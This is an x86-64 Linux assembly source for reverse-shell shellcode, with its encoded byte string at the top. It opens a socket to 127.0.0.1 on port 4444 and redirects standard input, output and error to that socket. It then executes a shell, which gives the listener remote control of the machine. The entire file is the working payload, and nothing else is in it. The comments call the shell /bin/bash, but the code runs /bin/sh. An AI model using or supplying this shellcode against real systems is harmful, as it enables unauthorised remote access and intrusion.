; "\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x29\x00\x00\x00\x48\xC7\xC7\x02\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC0\x2A\x00\x00\x00\x48\x31\xF6\x56\x68\x7F\x00\x00\x01\x68\x11\x5C\x00\x00\x6A\x02\x48\x89\xE6\x48\xC7\xC2\x10\x00\x00\x00\x0F\x05\x48\x31\xD2\x48\xC7\xC0\x21\x00\x00\x00\x48\x89\xD6\x0F\x05\x48\xFF\xC2\x48\x83\xFA\x03\x74\x02\xEB\xE9\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xD2\x48\x31\xF6\x0F\x05"



global _start

section .text
_start:

    ;cleaning registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ;calling socket syscall
    mov rax, 0x29
    mov rdi, 2 ; AF_INET
    mov rsi, 1 ;
    mov rdx, 0
    syscall

    mov rdi, rax ;set socketid to rdi

    ;connect syscall to connect to a socket
    xor rax, rax
    mov rax, 0x2a
    ;rdi is already the pointer to the socket so we dont pass it here
    ;pass the struct here
    xor rsi, rsi
    push rsi
    push 0x0100007f ;push 127.0.0.1 (byte for byte)
    push word 0x5c11 ;push port 4444 here (0x5c11 --> 4444)
    push word 0x02 ;AF_INET value (For communicating between processes on different hosts connected by IPV4, we use AF_INET)
    mov rsi, rsp ;set rsi to our struct (stack pointer)
    mov rdx, 16 ;size of our struct
    syscall

    xor rdx, rdx
    ;exec dup2
_changestd:
    mov rax, 0x21
    ;rdi already is socket id
    mov rsi, rdx
    syscall ;redirect file descriptors to the socket using dup2 syscall
    inc rdx
    cmp rdx, 3
    je _execbash ;if all file descriptors were redirect (0,1,2), jump to execute /bin/bash
    jmp _changestd 

_execbash: ;here we execute our /bin/bash. All inpuit/output will be redirected to the socket
    mov rax, 0x68732f6e69622f
    push rax
    mov rax, 0x3b
    mov rdi, rsp
    xor rdx, rdx
    xor rsi, rsi
    syscall
